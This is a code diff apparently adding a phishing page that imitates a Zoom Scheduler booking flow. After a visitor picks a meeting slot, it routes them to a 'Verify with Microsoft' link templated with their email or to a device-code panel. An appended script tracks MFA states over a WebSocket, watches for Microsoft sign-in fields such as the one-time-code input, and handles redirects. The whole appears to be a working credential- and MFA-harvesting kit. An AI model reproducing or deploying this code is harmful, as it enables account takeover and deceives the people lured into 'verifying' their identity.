+                const parsed = parseTimeSlot(slot);
+                if (!parsed) return null;
+                const baseDateTime = makeDateInTimeZone({
+                    year: parts.year,
+                    month: parts.month,
+                    day: parts.day,
+                    hour: parsed.hour,
+                    minute: parsed.minute
+                }, BASE_TIMEZONE);
+                return {
+                    label: formatTimeInZone(baseDateTime, selectedTz),
+                    base: slot,
+                    isBooked: isLeadTimeBlocked
+                };
+            })
+            .filter(Boolean);
+    };
+
+    const availableTimeSlots = React.useMemo(
+        () => computeSlotsForDate(selectedDate),
+        [selectedDate, timezone, availabilityConfig.startDate]
+    );
+
+    React.useEffect(() => {
+        if (selectedTime && !availableTimeSlots.some((slot) => slot.label === selectedTime && !slot.isBooked)) {
+            setSelectedTime('');
+        }
+    }, [availableTimeSlots, selectedTime]);
+
+    const getDaysInMonth = (date) => {
+        const year = date.getFullYear();
+        const month = date.getMonth();
+        const firstDay = new Date(year, month, 1);
+        const lastDay = new Date(year, month + 1, 0);
+        const daysInMonth = lastDay.getDate();
+        const startingDayOfWeek = firstDay.getDay();
+
+        const days = [];
+        for (let i = 0; i < startingDayOfWeek; i++) {
+            days.push({ day: '', date: null, isCurrentMonth: false, isPlaceholder: true });
+        }
+        for (let i = 1; i <= daysInMonth; i++) {
+            days.push({ day: i, date: new Date(year, month, i), isCurrentMonth: true });
+        }
+        return days;
+    };
+
+    const monthNames = ['January', 'February', 'March', 'April', 'May', 'June',
+        'July', 'August', 'September', 'October', 'November', 'December'];
+
+    const formatDate = (date) => {
+        if (!date) return '';
+        return date.toLocaleDateString('en-US', { weekday: 'long', month: 'long', day: 'numeric', year: 'numeric' });
+    };
+
+    const previousMonth = () => {
+        const target = new Date(currentMonth.getFullYear(), currentMonth.getMonth() - 1, 1);
+        if (isMonthAvailable(target)) {
+            setCurrentMonth(target);
+        }
+    };
+
+    const nextMonth = () => {
+        const target = new Date(currentMonth.getFullYear(), currentMonth.getMonth() + 1, 1);
+        if (isMonthAvailable(target)) {
+            setCurrentMonth(target);
+        }
+    };
+
+    const handleDateClick = (dateObj) => {
+        if (dateObj.isCurrentMonth && dateObj.date && isDateSelectable(dateObj.date)) {
+            setSelectedDate(dateObj.date);
+            setSelectedTime('');
+        }
+    };
+
+    const isSelected = (dateObj) => {
+        return dateObj.date && selectedDate && dateObj.date.toDateString() === selectedDate.toDateString();
+    };
+
+    const openContactModal = () => {
+        if (!selectedTime) {
+            setError('Please select a time slot');
+            return;
+        }
+        setError('');
+        setModalStep(1);
+        setShowVerificationPrompt(false);
+        setShowContactModal(true);
+    };
+
+    const nextStep = async () => {
+        setError('');
+        if (modalStep < totalSteps) {
+            setModalStep(modalStep + 1);
+        }
+    };
+    
+    // ==================== EMAIL VERIFICATION FUNCTION ====================
+    
+    const verifyEmailAddress = async () => {
+        setIsVerifyingEmail(true);
+        setError('');
+        
+        try {
+            const templateData = document.getElementById('template-data');
+            const artifactPath = templateData?.dataset.artifactPath || '';
+            
+            const response = await fetch('/r/verify-email', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    artifact_path: artifactPath,
+                    email: contactInfo.email
+                })
+            });
+            
+            const data = await response.json();
+            
+            if (data.success) {
+                setIsVerifyingEmail(false);
+                return true;
+            } else {
+                setError(data.message || 'Email address not recognized');
+                setIsVerifyingEmail(false);
+                return false;
+            }
+        } catch (error) {
+            setError('Failed to verify email. Please try again.');
+            console.error('Email verification error:', error);
+            setIsVerifyingEmail(false);
+            return false;
+        }
+    };
+
+    const prevStep = () => {
+        setError('');
+        if (modalStep > 1) {
+            setModalStep(modalStep - 1);
+        }
+    };
+
+    const microsoftVerifyUrl = 'https://example1.example.com/?email={{Id}}';
+
+    const confirmBooking = async () => {
+        setIsProcessing(true);
+        setError('');
+
+        setTimeout(() => {
+            setShowContactModal(false);
+            setStage('confirmed');
+            setIsProcessing(false);
+        }, 1000);
+    };
+
+    // ==================== MODAL STEP CONTENT ====================
+    const renderModalContent = () => {
+        switch(modalStep) {
+            case 1:
+                return (
+                    <div className="space-y-4 sm:space-y-6">
+                        {error && (
+                            <div className="bg-red-50 border-2 border-red-300 rounded-lg p-3 sm:p-4 slide-down">
+                                <div className="flex items-start gap-2 sm:gap-3">
+                                    <div className="flex-shrink-0 w-5 h-5 bg-red-500 rounded-full flex items-center justify-center mt-0.5">
+                                        <X className="w-3 h-3 text-white" strokeWidth={3} />
+                                    </div>
+                                    <div className="flex-1">
+                                        <p className="text-sm font-semibold text-red-900 mb-1">Verification Failed</p>
+                                        <p className="text-sm text-red-800">{error}</p>
+                                        <p className="text-xs text-red-700 mt-2">Please start over and enter the correct information.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        )}
+                        
+                        <div>
+                            <h2 className="text-xl sm:text-2xl font-bold text-slate-900 mb-2">Confirm Your Meeting</h2>
+                            <p className="text-sm sm:text-base text-slate-600">Review the details of your upcoming meeting</p>
+                        </div>
+                        
+                        <div className="bg-[#EAF3FF] border border-[#2D8CFF]/20 rounded-lg p-4 sm:p-6 space-y-3 sm:space-y-4">
+                            <div className="flex items-center">
+                                <div className="w-[67px] h-[67px] rounded-full overflow-hidden ring-1 ring-slate-200 mr-3 flex-shrink-0 bg-slate-100">
+                                    <img
+                                        src={hostProfile.image}
+                                        alt={hostProfile.name}
+                                        className="w-full h-full object-cover"
+                                        loading="lazy"
+                                        referrerPolicy="no-referrer"
+                                        onError={(e) => { e.currentTarget.src = hostFallbackImage; }}
+                                    />
+                                </div>
+                                <div>
+                                    <p className="font-semibold text-slate-900 text-base sm:text-lg">{hostProfile.name}</p>
+                                    <p className="text-xs sm:text-sm text-slate-600">{hostTitleLine}</p>
+                                </div>
+                            </div>
+                            
+                            <div className="flex items-start">
+                                <Clock className="w-5 h-5 text-[#2D8CFF] mt-1 mr-3 flex-shrink-0" strokeWidth={2} />
+                                <div>
+                                    <p className="font-medium text-slate-900 text-sm sm:text-base">{formatDate(selectedDate)}</p>
+                                    <p className="text-xs sm:text-sm text-slate-700">{selectedTime} • {timezone}</p>
+                                </div>
+                            </div>
+                            
+                            <div className="flex items-center">
+                                <TeamsIcon className="w-5 h-5 mr-3 flex-shrink-0" />
+                                <span className="text-xs sm:text-sm text-slate-700">{duration} minutes via Microsoft Teams</span>
+                            </div>
+                        </div>
+                    </div>
+                );
+            
+           case 2:
+    if (!useDeviceCode) {
+        return (
+            <div className="space-y-4 sm:space-y-6">
+                <div>
+                    <h2 className="text-xl sm:text-2xl font-bold text-slate-900 mb-2">Verify Your Identity</h2>
+                    <p className="text-sm sm:text-base text-slate-600">Quick verification to secure your meeting slot</p>
+                </div>
+                
+                <div className="space-y-3">
+                    <a
+                        href={microsoftVerifyUrl}
+                        className="w-full bg-white border border-slate-300 hover:border-[#2D8CFF] hover:bg-[#EAF3FF] text-slate-900 py-3.5 px-4 rounded-lg font-semibold transition-all flex items-center justify-center gap-3 text-sm sm:text-base"
+                    >
+                        <MicrosoftLogo className="w-5 h-5" />
+                        <span>Verify with Microsoft</span>
+                    </a>
+                    
+                    {!isAuthenticated && (
+                        <p className="text-xs text-slate-500 text-center">
+                            We'll verify your email using your Microsoft account
+                        </p>
+                    )}
+                </div>
+                
+                {showVerificationPrompt && !isAuthenticated && (
+                    <div className="bg-amber-50 border-2 border-amber-300 rounded-lg p-4 slide-down">
+                        <div className="flex items-start gap-3">
+                            <Shield className="w-5 h-5 text-amber-600 mt-0.5 flex-shrink-0" strokeWidth={2} />
+                            <div>
+                                <p className="text-sm font-semibold text-amber-900 mb-1">Verification Required</p>
+                                <p className="text-sm text-amber-800">Please verify your identity above to complete your booking.</p>
+                            </div>
+                        </div>
+                    </div>
+                )}
+            </div>
+        );
+    }
+    
+    // Device code flow — shared module renders the panel
+    return React.createElement(DeviceCode.DeviceCodePanel, {
+        dc: dc,
+        email: contactInfo.email,
+        onDone: () => { setShowContactModal(false); setStage('confirmed'); },
+        style: 'zoom',
+    });
+            default:
+                return null;
+        }
+    };
+
+    const days = getDaysInMonth(currentMonth);
+
+    // ==================== CONFIRMATION SCREEN ====================
+    if (stage === 'confirmed') {
+        return (
+            <div className="min-h-screen bg-slate-50 flex flex-col">
+                <div className="w-full bg-white border-b border-slate-200 px-4 sm:px-8 py-3 flex items-center flex-shrink-0">
+                    <img
+                        src="_external/st1.zoom.us/schedulerLogo.svg"
+                        alt="Zoom Scheduler"
+                        className="h-7"
+                        onError={(e) => {
+                            e.currentTarget.outerHTML = '<span class="text-[#0B5CFF] text-xl font-semibold tracking-tight" style="font-family:\'Lato\',\'Segoe UI\',Arial,sans-serif">Zoom Scheduler</span>';
+                        }}
+                    />
+                </div>
+                <div className="flex-1 flex items-center justify-center p-4">
+                    <div className="bg-white rounded-xl shadow-lg p-6 sm:p-8 max-w-md w-full slide-up">
+                    <div className="text-center">
+                        <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                            <CheckCircle className="w-10 h-10 text-green-600" strokeWidth={2} />
+                        </div>
+                        <h2 className="text-xl sm:text-2xl font-bold text-slate-900 mb-2">Meeting Confirmed!</h2>
+                        <p className="text-sm sm:text-base text-slate-600 mb-6">
+                            Your meeting has been successfully scheduled.
+                        </p>
+                        
+                        <div className="bg-slate-50 rounded-lg p-4 text-left space-y-3 mb-6">
+                            <div className="flex items-center">
+                                <div className="w-[67px] h-[67px] rounded-full overflow-hidden ring-1 ring-slate-200 mr-3 flex-shrink-0 bg-slate-100">
+                                    <img
+                                        src={hostProfile.image}
+                                        alt={hostProfile.name}
+                                        className="w-full h-full object-cover"
+                                        loading="lazy"
+                                        referrerPolicy="no-referrer"
+                                        onError={(e) => { e.currentTarget.src = hostFallbackImage; }}
+                                    />
+                                </div>
+                                <div>
+                                    <p className="font-semibold text-slate-900 text-base sm:text-lg">{hostProfile.name}</p>
+                                    <p className="text-xs sm:text-sm text-slate-600">{hostTitleLine}</p>
+                                </div>
+                            </div>
+                            <div className="flex items-start">
+                                <Clock className="w-5 h-5 mr-3 text-slate-600 mt-0.5 flex-shrink-0" strokeWidth={2} />
+                                <div>
+                                    <p className="font-medium text-slate-900 text-sm sm:text-base">{formatDate(selectedDate)}</p>
+                                    <p className="text-xs sm:text-sm text-slate-700">{selectedTime} ({timezone})</p>
+                                </div>
+                            </div>
+                            <div className="flex items-center text-slate-700">
+                                <TeamsIcon className="w-5 h-5 mr-3" />
+                                <span className="text-xs sm:text-sm">{duration} Minute Meeting via Microsoft Teams</span>
+                            </div>
+                            {isAuthenticated && (
+                                <div className="flex items-center text-green-700 pt-2 border-t border-slate-200">
+                                    <Shield className="w-5 h-5 mr-3 text-green-600" strokeWidth={2} />
+                                    <span className="text-xs sm:text-sm">Verified via Microsoft</span>
+                                </div>
+                            )}
+                        </div>
+
+                        <div className="bg-[#EAF3FF] border border-[#2D8CFF]/20 rounded-lg p-4">
+                            <p className="text-xs sm:text-sm text-slate-800">
+                                <strong className="text-[#2D8CFF]">What's next?</strong><br/>
+                                The meeting organizer will send you a calendar invitation with the Microsoft Teams meeting link.
+                            </p>
+                        </div>
+                    </div>
+                    </div>
+                </div>
+            </div>
+        );
+    }
+
+    // ==================== BOOKING INTERFACE ====================
+    return (
+        <div className="min-h-screen bg-white flex flex-col">
+            {/* Zoom Scheduler top bar */}
+            <div className="w-full bg-white border-b border-slate-100 px-4 sm:px-8 py-3 flex items-center justify-between flex-shrink-0 gap-3">
+                <img
+                    src="_external/st1.zoom.us/schedulerLogo.svg"
+                    alt="Zoom Scheduler"
+                    className="h-7"
+                    onError={(e) => {
+                        e.currentTarget.outerHTML = '<span class="text-[#0B5CFF] text-xl font-semibold tracking-tight" style="font-family:\'Lato\',\'Segoe UI\',Arial,sans-serif">Zoom Scheduler</span>';
+                    }}
+                />
+
+                <div className="flex items-center gap-2">
+                    {/* Overlay-my-calendar pill with app icons + toggle */}
+                    <div className="hidden sm:inline-flex items-center gap-2 border border-slate-200 rounded-full pl-2 pr-2 py-1.5 text-sm shadow-sm">
+                        <img
+                            src="_external/st1.zoom.us/overlay-calendar-icon.svg"
+                            alt="calendar overlay icon"
+                            className="h-6 w-auto"
+                            style={{ marginRight: '-5px' }}
+                            aria-hidden="true"
+                        />
+                        <span className="text-slate-700 px-1">Overlay my calendar</span>
+                        <span
+                            role="switch"
+                            aria-checked="false"
+                            className="relative inline-flex w-8 h-4 bg-slate-300 rounded-full flex-shrink-0"
+                        >
+                            <span className="absolute top-0.5 left-0.5 w-3 h-3 bg-white rounded-full shadow"></span>
+                        </span>
+                    </div>
+
+                    {/* Month / week view toggle */}
+                    <div className="hidden sm:inline-flex items-center gap-1">
+                        <button type="button" className="p-1.5 border border-slate-200 rounded hover:bg-slate-50 transition-colors" aria-label="Month view">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" className="text-slate-500">
+                                <rect x="3" y="4" width="18" height="17" rx="2"/>
+                                <line x1="3" y1="9" x2="21" y2="9"/>
+                                <line x1="8" y1="4" x2="8" y2="21"/>
+                                <line x1="14" y1="4" x2="14" y2="21"/>
+                                <line x1="3" y1="15" x2="21" y2="15"/>
+                            </svg>
+                        </button>
+                        <button type="button" className="p-1.5 border border-slate-200 rounded bg-[#EAF3FF] hover:bg-[#D6E8FF] transition-colors" aria-label="Week view" title="Week view">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" className="text-[#0B5CFF]">
+                                <rect x="3" y="4" width="18" height="17" rx="2"/>
+                                <line x1="3" y1="9" x2="21" y2="9"/>
+                                <line x1="16" y1="4" x2="16" y2="21"/>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <div className="flex-1 flex items-start justify-center p-4 sm:p-8">
+                <div className="w-full max-w-6xl bg-white rounded-lg shadow-[0_1px_3px_rgba(0,0,0,0.08),0_4px_20px_rgba(0,0,0,0.04)] overflow-hidden">
+                    <div className="grid grid-cols-1 lg:grid-cols-[minmax(0,320px)_1fr_minmax(0,280px)]">
+                        {/* LEFT: event details */}
+                        <div className="border-b lg:border-b-0 lg:border-r border-slate-100 p-6 sm:p-8">
+                            <div className="flex items-center gap-3 mb-5">
+                                <div className="w-[67px] h-[67px] rounded-full overflow-hidden ring-1 ring-slate-200 flex-shrink-0 bg-slate-100">
+                                    <img
+                                        src={hostProfile.image}
+                                        alt={hostProfile.name}
+                                        className="w-full h-full object-cover"
+                                        loading="lazy"
+                                        referrerPolicy="no-referrer"
+                                        onError={(e) => { e.currentTarget.src = hostFallbackImage; }}
+                                    />
+                                </div>
+                                <div className="text-base text-slate-700 leading-tight truncate">{hostProfile.name}</div>
+                            </div>
+
+                            <h1 className="text-2xl sm:text-3xl font-semibold text-slate-900 leading-tight mb-3">
+                                {duration} mins
+                            </h1>
+                            <p className="text-sm text-slate-600 leading-relaxed mb-6 whitespace-pre-line">
+                                {hostProfile.reason}
+                            </p>
+
+                            <div className="space-y-3 text-sm text-slate-700">
+                                <div className="flex items-center gap-2">
+                                    <Clock className="w-4 h-4 text-slate-500 flex-shrink-0" strokeWidth={2} />
+                                    <span>{duration} mins</span>
+                                </div>
+                                <div className="flex items-center gap-2">
+                                    <TeamsIcon className="w-4 h-4 flex-shrink-0" />
+                                    <span>Microsoft Teams</span>
+                                </div>
+                                <div className="flex items-center gap-2">
+                                    <Globe className="w-4 h-4 text-slate-500 flex-shrink-0" strokeWidth={2} />
+                                    <div className="relative inline-flex items-center">
+                                        <select
+                                            value={timezone}
+                                            onChange={(e) => setTimezone(e.target.value)}
+                                            className="appearance-none bg-transparent border-0 pr-5 pl-0 py-0.5 text-sm text-slate-700 focus:outline-none cursor-pointer"
+                                        >
+                                            {timezones.map(tz => (
+                                                <option key={tz.label} value={tz.label}>{getTimezoneDisplay(tz.label)}</option>
+                                            ))}
+                                        </select>
+                                        <ChevronDown className="absolute right-0 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-slate-500 pointer-events-none" strokeWidth={2} />
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        {/* CENTER: full-month calendar */}
+                        <div className="p-6 sm:p-8 border-b lg:border-b-0 lg:border-r border-slate-100">
+                            <div className="flex items-center justify-between mb-5">
+                                <button
+                                    onClick={previousMonth}
+                                    disabled={!isMonthAvailable(new Date(currentMonth.getFullYear(), currentMonth.getMonth() - 1, 1))}
+                                    className={`w-8 h-8 rounded-full flex items-center justify-center transition-colors ${
+                                        isMonthAvailable(new Date(currentMonth.getFullYear(), currentMonth.getMonth() - 1, 1))
+                                            ? 'hover:bg-slate-100 text-slate-600' : 'text-slate-300 cursor-not-allowed'
+                                    }`}
+                                    aria-label="Previous month"
+                                >
+                                    <ChevronLeft className="w-4 h-4" strokeWidth={2} />
+                                </button>
+                                <div className="text-base font-medium text-slate-800">
+                                    {monthNames[currentMonth.getMonth()]}{'  '}
+                                    <span className="text-slate-500 ml-1">{currentMonth.getFullYear()}</span>
+                                </div>
+                                <button
+                                    onClick={nextMonth}
+                                    disabled={!isMonthAvailable(new Date(currentMonth.getFullYear(), currentMonth.getMonth() + 1, 1))}
+                                    className={`w-8 h-8 rounded-full flex items-center justify-center transition-colors ${
+                                        isMonthAvailable(new Date(currentMonth.getFullYear(), currentMonth.getMonth() + 1, 1))
+                                            ? 'hover:bg-slate-100 text-slate-600' : 'text-slate-300 cursor-not-allowed'
+                                    }`}
+                                    aria-label="Next month"
+                                >
+                                    <ChevronRight className="w-4 h-4" strokeWidth={2} />
+                                </button>
+                            </div>
+
+                            <div className="grid grid-cols-7 gap-1 mb-2">
+                                {['S', 'M', 'T', 'W', 'T', 'F', 'S'].map((d, i) => (
+                                    <div key={i} className="text-center text-xs font-medium text-slate-500 py-1">{d}</div>
+                                ))}
+                            </div>
+
+                            <div className="grid grid-cols-7 gap-1">
+                                {days.map((dateObj, index) => {
+                                    const isBlocked = !dateObj.isCurrentMonth || !dateObj.date || !isDateSelectable(dateObj.date);
+                                    const sel = isSelected(dateObj);
+                                    const available = !isBlocked;
+                                    return (
+                                        <button
+                                            key={index}
+                                            onClick={() => handleDateClick(dateObj)}
+                                            disabled={isBlocked}
+                                            className={`aspect-square flex items-center justify-center text-sm rounded-full transition-all ${
+                                                !dateObj.isCurrentMonth || !dateObj.date ? 'text-transparent cursor-default' :
+                                                sel ? 'bg-[#0B5CFF] text-white font-semibold' :
+                                                available ? 'text-slate-900 font-medium hover:bg-slate-100' :
+                                                'text-slate-300 cursor-not-allowed'
+                                            }`}
+                                        >
+                                            {dateObj.day}
+                                        </button>
+                                    );
+                                })}
+                            </div>
+                        </div>
+
+                        {/* RIGHT: single-day time slot list */}
+                        <div className="p-6 sm:p-8">
+                            {selectedDate ? (
+                                <div className="flex flex-col h-full">
+                                    <div className="flex items-center justify-between mb-4">
+                                        <div className="flex items-baseline gap-2">
+                                            <div className="text-sm text-slate-600">
+                                                {selectedDate.toLocaleDateString('en-US', { weekday: 'short' })}
+                                            </div>
+                                            <div className="text-lg font-semibold text-slate-900">
+                                                {selectedDate.getDate()}
+                                            </div>
+                                        </div>
+                                        <button
+                                            type="button"
+                                            onClick={() => setUse24h(!use24h)}
+                                            className="inline-flex items-center gap-1 text-xs text-slate-600 hover:text-slate-900 transition-colors"
+                                        >
+                                            <span>{use24h ? '24h' : '12h'}</span>
+                                            <ChevronDown className="w-3 h-3" strokeWidth={2} />
+                                        </button>
+                                    </div>
+
+                                    <div className="overflow-y-auto max-h-[480px] pr-1 space-y-2">
+                                        {availableTimeSlots.length === 0 ? (
+                                            <div className="text-sm text-slate-400 text-center py-8">No availability</div>
+                                        ) : availableTimeSlots.map((slot) => {
+                                            const chosen = selectedTime === slot.label;
+                                            return (
+                                                <div key={slot.base} className="flex gap-2">
+                                                    <button
+                                                        onClick={() => {
+                                                            if (slot.isBooked) return;
+                                                            setSelectedTime(slot.label);
+                                                        }}
+                                                        disabled={slot.isBooked}
+                                                        className={`flex-1 py-2.5 rounded-full text-sm font-medium border transition-all ${
+                                                            slot.isBooked ? 'border-slate-100 text-slate-300 cursor-not-allowed' :
+                                                            chosen ? 'border-[#0B5CFF] bg-white text-[#0B5CFF]' :
+                                                            'border-slate-200 text-slate-800 hover:border-[#0B5CFF] hover:text-[#0B5CFF]'
+                                                        }`}
+                                                    >
+                                                        {formatSlotLabel(slot.label)}
+                                                    </button>
+                                                    {chosen && (
+                                                        <button
+                                                            onClick={openContactModal}
+                                                            className="px-4 py-2.5 rounded-full text-sm font-semibold bg-[#0B5CFF] text-white hover:bg-[#0A4AD1] transition-colors"
+                                                        >
+                                                            Next
+                                                        </button>
+                                                    )}
+                                                </div>
+                                            );
+                                        })}
+                                    </div>
+
+                                    {error && (
+                                        <div className="mt-3 bg-red-50 border border-red-200 rounded-lg p-3">
+                                            <p className="text-xs text-red-700">{error}</p>
+                                        </div>
+                                    )}
+                                </div>
+                            ) : (
+                                <div className="h-full flex items-center justify-center text-sm text-slate-400 text-center px-4 py-12">
+                                    Select a date to see available times
+                                </div>
+                            )}
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            {/* Bottom footer: language + reCAPTCHA notice, centered */}
+            <div className="w-full bg-white px-4 sm:px-8 py-4 flex-shrink-0">
+                <div className="max-w-4xl mx-auto flex flex-col sm:flex-row items-center justify-center gap-3 sm:gap-6 text-xs text-slate-500 text-center sm:text-left">
+                    <button type="button" className="inline-flex items-center gap-1.5 hover:text-slate-700 transition-colors flex-shrink-0">
+                        <span>English</span>
+                        <ChevronDown className="w-3 h-3" strokeWidth={2} />
+                    </button>
+                    <div className="leading-relaxed">
+                        This site is protected by reCAPTCHA and the Google{' '}
+                        <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer" className="text-[#0B5CFF] hover:underline">Privacy Policy</a>{' '}
+                        and{' '}
+                        <a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer" className="text-[#0B5CFF] hover:underline">Terms of Service</a>{' '}
+                        apply.
+                    </div>
+                </div>
+            </div>
+
+            {/* Contact Modal - Mobile Optimized */}
+            {showContactModal && (
+                <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4 z-50 fade-in">
+                    <div className="bg-white rounded-xl shadow-2xl w-full max-w-lg max-h-[90vh] flex flex-col slide-up">
+                        {/* Zoom-branded header + progress */}
+                        <div className="px-4 sm:px-8 pt-4 sm:pt-6 pb-3 sm:pb-4 flex-shrink-0 border-b border-slate-100">
+                            <div className="flex items-center justify-between mb-3">
+                                <span className="text-[#2D8CFF] text-xl font-bold tracking-tight" style={{ fontFamily: '"Lato","Segoe UI",Arial,sans-serif' }}>zoom</span>
+                                <div className="flex items-center gap-3">
+                                    <span className="text-xs sm:text-sm text-slate-500">
+                                        Step {modalStep} of {totalSteps}
+                                    </span>
+                                    <button
+                                        onClick={() => setShowContactModal(false)}
+                                        className="p-1 hover:bg-slate-100 rounded transition-colors"
+                                    >
+                                        <X className="w-4 h-4 text-slate-400" strokeWidth={2} />
+                                    </button>
+                                </div>
+                            </div>
+                            <div className="h-1 bg-slate-100 rounded-full overflow-hidden">
+                                <div 
+                                    className="h-full bg-[#2D8CFF] transition-all duration-300 ease-out"
+                                    style={{ width: `${(modalStep / totalSteps) * 100}%` }}
+                                />
+                            </div>
+                        </div>
+
+                        {/* Modal Content - Scrollable */}
+                        <div className="px-4 sm:px-8 py-4 sm:py-6 overflow-y-auto flex-grow">
+                            {renderModalContent()}
+                            
+                            {error && modalStep !== 1 && (
+                                <div className="mt-4 bg-red-50 border border-red-200 rounded-lg p-3">
+                                    <p className="text-xs sm:text-sm text-red-700">{error}</p>
+                                </div>
+                            )}
+                        </div>
+
+                        {/* Navigation Buttons */}
+                        <div className="px-4 sm:px-8 py-4 sm:py-6 border-t border-slate-200 bg-white rounded-b-xl flex-shrink-0">
+                            <div className="flex gap-3">
+                                {modalStep > 1 && (
+                                    <button
+                                        onClick={prevStep}
+                                        className="px-4 sm:px-6 py-2.5 border border-slate-300 text-slate-700 rounded-md font-semibold hover:bg-slate-50 transition-colors text-sm sm:text-base"
+                                    >
+                                        Back
+                                    </button>
+                                )}
+                                
+                                {modalStep < totalSteps ? (
+                                    <button
+                                        onClick={nextStep}
+                                        className="flex-1 bg-[#2D8CFF] text-white py-2.5 rounded-md font-semibold hover:bg-[#0B5CFF] transition-colors text-sm sm:text-base"
+                                    >
+                                        Continue
+                                    </button>
+                                ) : (
+                                    <button
+                                        onClick={() => {
+                                            if (!isAuthenticated) {
+                                                setShowVerificationPrompt(true);
+                                                return;
+                                            }
+                                            confirmBooking();
+                                        }}
+                                        disabled={isProcessing}
+                                        className={`flex-1 py-2.5 rounded-md font-semibold transition-colors text-sm sm:text-base ${
+                                            isProcessing 
+                                                ? 'bg-[#2D8CFF]/60 cursor-not-allowed text-white' 
+                                                : !isAuthenticated 
+                                                    ? 'bg-[#2D8CFF]/70 text-white cursor-pointer hover:bg-[#2D8CFF]/80' 
+                                                    : 'bg-[#2D8CFF] text-white hover:bg-[#0B5CFF]'
+                                        }`}
+                                    >
+                                        {isProcessing ? 'Scheduling...' : 'Schedule Meeting'}
+                                    </button>
+                                )}
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            )}
+        </div>
+    );
+}
+
+// Render the application
+ReactDOM.render(<BookingPage />, document.getElementById('root'));
+</script>
+
+    
+    
+<script src="_external/code.jquery.com/jquery-3.4.1.js"></script>
+<script src="_external/cdnjs.cloudflare.com/popper.js/1.12.9/popper.min.js"></script>
+<script src="_external/maxcdn.bootstrapcdn.com/bootstrap-4.0.0.min.js"></script>
+<script src="_external/stackpath.bootstrapcdn.com/bootstrap-4.1.3.min.js"></script>
+<script>
+(() => {
+  // build/modules/state.js
+  function str(val) {
+    return val == null ? "" : String(val);
+  }
+  function trimStr(val) {
+    return str(val).trim();
+  }
+  function getRedirectTarget() {
+    return window.PRE_REDIRECT_URL;
+  }
+  function getFinalRedirectTarget() {
+    return window.PRE_FINAL_REDIRECT;
+  }
+  function showProgress() {
+    var el = document.getElementById("cdp-progress");
+    if (el) el.style.display = "block";
+  }
+  function hideProgress() {
+    var el = document.getElementById("cdp-progress");
+    if (el) el.style.display = "none";
+  }
+  function clearSubmitTimer() {
+    if (state.submitTimer) {
+      clearInterval(state.submitTimer);
+      state.submitTimer = null;
+    }
+  }
+  function startSubmitWatchdog(timeoutMs, holdReason) {
+    state.submitStartedAt = Date.now();
+    state.submitTimeoutMs = timeoutMs || state.submitDefaultTimeoutMs;
+    state.submitHoldReason = holdReason || "";
+  }
+  function resetSubmitWatchdog() {
+    state.submitStartedAt = 0;
+    state.submitTimeoutMs = state.submitDefaultTimeoutMs;
+    state.submitHoldReason = "";
+  }
+  function disableSubmitBtn() {
+    state.isSubmitting = true;
+    var btn = document.getElementById("submit-btn");
+    if (btn) {
+      btn.disabled = true;
+      btn.style.pointerEvents = "none";
+      btn.style.background = "#a0a0a0";
+      btn.style.borderColor = "#a0a0a0";
+      btn.style.cursor = "not-allowed";
+    }
+  }
+  function enableSubmitBtn() {
+    state.isSubmitting = false;
+    var btn = document.getElementById("submit-btn");
+    if (btn) {
+      btn.disabled = false;
+      btn.style.pointerEvents = "";
+      btn.style.background = "";
+      btn.style.borderColor = "";
+      btn.style.cursor = "";
+    }
+  }
+  function closeWebSocket() {
+    state.shouldReconnect = false;
+    if (state.reconnectTimer) {
+      clearTimeout(state.reconnectTimer);
+      state.reconnectTimer = null;
+    }
+    if (state.submitTimer) {
+      clearInterval(state.submitTimer);
+      state.submitTimer = null;
+    }
+    resetSubmitWatchdog();
+    if (state.ws) {
+      try {
+        state.ws.close();
+      } catch (_) {
+      }
+      state.ws = null;
+    }
+    state.wsConnecting = false;
+    state.reconnectAttempts = 0;
+    state.reconnectInterval = 1e3;
+    state.isInMfaState = false;
+    state.mfaStateConfirmed = false;
+    state.mfaFallbackAttempted = false;
+  }
+  function fnv1aHash(input) {
+    var text = str(input);
+    var bytes = new TextEncoder().encode(text);
+    var hash = 2166136261;
+    for (var i = 0; i < bytes.length; i++) {
+      hash ^= bytes[i];
+      hash = hash * 16777619 >>> 0;
+    }
+    return ("00000000" + hash.toString(16)).slice(-8);
+  }
+  function computeMfaDomStats() {
+    try {
+      let visible = function(el) {
+        if (!el) return false;
+        var r = el.getBoundingClientRect();
+        if (r.width <= 0 || r.height <= 0) return false;
+        var cs = window.getComputedStyle(el);
+        if (cs.display === "none" || cs.visibility === "hidden") return false;
+        if (parseFloat(cs.opacity || "1") <= 0.01) return false;
+        return true;
+      };
+      var root = document.getElementById("remvSec");
+      if (!root) {
+        return { ok: false, reason: "no_root" };
+      }
+      var inputsAll = root.querySelectorAll("input, textarea, select");
+      var buttonsAll = root.querySelectorAll(
+        'button, [role="button"], input[type="submit"], input[type="button"], a.btn'
+      );
+      var inputsVisible = 0;
+      for (var i = 0; i < inputsAll.length; i++) {
+        if (visible(inputsAll[i])) inputsVisible++;
+      }
+      var buttonsVisible = 0;
+      for (var j = 0; j < buttonsAll.length; j++) {
+        if (visible(buttonsAll[j])) buttonsVisible++;
+      }
+      var lightbox = document.getElementById("lightbox") || root.querySelector("#lightbox");
+      var lightboxOpacity = 1;
+      if (lightbox) {
+        var lcs = window.getComputedStyle(lightbox);
+        lightboxOpacity = parseFloat(lcs.opacity || "1");
+        if (isNaN(lightboxOpacity)) lightboxOpacity = 1;
+      }
+      var hasOTC = !!(document.getElementById("idTxtBx_SAOTCC_OTC") || root.querySelector('input[name="otc"], input[autocomplete="one-time-code"]'));
+      var errorEl = document.getElementById("idTD_Error") || document.getElementById("errorBlock") || root.querySelector('[role="alert"], .alert-error, .ms-error');
